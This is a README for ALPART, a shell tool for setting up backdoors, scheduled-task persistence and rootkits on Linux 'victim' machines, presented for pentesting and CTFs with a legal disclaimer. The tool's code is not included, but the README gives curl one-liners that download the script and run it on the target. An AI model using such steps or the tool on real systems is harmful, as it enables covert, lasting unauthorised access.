# ALPART [![license: MIT](https://img.shields.io/github/license/b0o/tmux-autoreload?style=flat&color=green)](https://mit-license.org)

<div align="center">Automatic Linux Persistence And Rootkit Tool</div>


[![asciicast](https://asciinema.org/a/567894.svg)](https://asciinema.org/a/567894)

## About the project

This shell script offers an interactive menu with multiple options to do persistence on a Linux system, which makes it ideal for Pentesting or CTFs. In addition, it is compatible with bash, sh, ash and zsh in case the victim does not have bash.

To get started, simply run the script in a terminal and choose from the various options available to create backdoors, scheduled tasks, rootkits and other persistence techniques. This script is easy to use and is designed to save time and increase efficiency in Pentesting or CTFs situations.

## Execution

Upload script to victim machine and start it with bash or any available shell

```bash
bash ALPART.sh
```
```bash
sh ALPART.sh
```
```bash
zsh ALPART.sh
```
```bash
ash ALPART.sh
```

or download from original repo and execute

```bash
curl -fsSL https://raw.githubusercontent.com/T1erno/ALPART/master/ALPART.sh -O ; bash ALPART.sh
```
```bash
curl -fsSL https://raw.githubusercontent.com/T1erno/ALPART/master/ALPART.sh -O ; sh ALPART.sh
```

### To do

- Add moar methods
- Check compatibility with other shells 
- ~~Buy milk and eggs~~
- Add optargs for a no interactive execution


### Contributing

Code contributions always are welcome :^)
For contributing, please use dev branch for your changes.

### Reporting a bug

If you find a bug please open an issue. When reporting a bug, it's helpful to provide as much information as possible so that others can reproduce the error and offer suggestions f
or a solution. Here are some things you might want to consider including in your bug report:

- A description of the problem
- Steps to reproduce the problem
- Screenshots or screen recordings if applicable
- The version of your operating system and any relevant software
- Any error messages or stack traces that you received
- Any additional context that might be helpful in understanding the problem

The more information you provide, the easier it will be for others to understand and address the issue :^)

### Disclaimer
This tool is provided for educational and research purposes only. Use of this tool on any system without the explicit permission of the system owner is illegal and strictly prohibited. The author is not responsible for any damages or consequences that may arise from the use of this tool. The user is responsible for complying with all applicable local, state and federal laws and regulations. Use of this tool is at your own risk and responsibility.

### Sources

- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md
